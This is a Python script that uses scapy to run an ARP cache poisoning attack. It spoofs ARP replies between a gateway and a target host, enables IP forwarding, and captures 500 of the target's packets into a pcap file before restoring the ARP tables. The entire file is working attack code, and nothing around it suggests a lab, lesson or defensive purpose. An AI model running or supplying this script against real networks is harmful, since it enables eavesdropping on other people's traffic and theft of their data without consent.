from scapy.layers.l2 import Ether
from threading import Thread
from time import sleep
from os import system,geteuid,kill,getpid
from signal import SIGTERM
from scapy.all import ARP,srp,send,sniff,wrpcap
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
def get_mac(ip:str):
    arp_req=ARP(pdst=ip)
    broad_cast=Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast=broad_cast/arp_req
    answer=srp(arp_req_broadcast,timeout=5,verbose=False)[0]#[ip] [mac [ip]]
    return None if answer is None else answer[0][1].hwsrc
def restore(gateway_ip,gateway_mac,target_ip,target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    #Disable ip forward on a mac
    system("sysctl -w net.inet.ip.forwarding=0")
    #kill mac process
    kill(getpid(),SIGTERM)

def arp_cache_poisioning(gateway_ip,gateway_mac,target_ip,target_mac):
    prRed('[*] Attack Started')
    try:
        cnt=0
        while True:
            cnt+=2
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            prGreen(f'number of packet has been sent {cnt}'.title())
            sleep(2)
    except KeyboardInterrupt :
        prCyan('[*] Terminate Arp Poisionging Attack Restore Netowrk Setting')
        restore(gateway_ip,gateway_mac,target_ip,target_mac)
if geteuid()!=0:
    prCyan('Run As Admin')
gateway_ip=""
gateway_mac=get_mac(gateway_ip)
target_ip=""
target_mac=get_mac(target_ip)
if target_mac is None or gateway_mac is None:
    prRed('Enable To Find GateWay Or Target Mac Address')
    exit(0)
prGreen('Enable Ip ForWard')
system("sysctl -w net.inet.ip.forwarding=1")
thread=Thread(target=arp_cache_poisioning,args=(gateway_ip, gateway_mac, target_ip, target_mac))
thread.start()
try:
    prGreen('[*] Starting Capture The Network With 500 packet')
    pkts=sniff(count=500,filter="ip host "+target_ip)
    wrpcap(target_ip+'.pcap',pkts)
except KeyboardInterrupt:
    pass
except Exception as e:
    print(e)
finally:
    prGreen('[*] Stop Capture The Network')
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    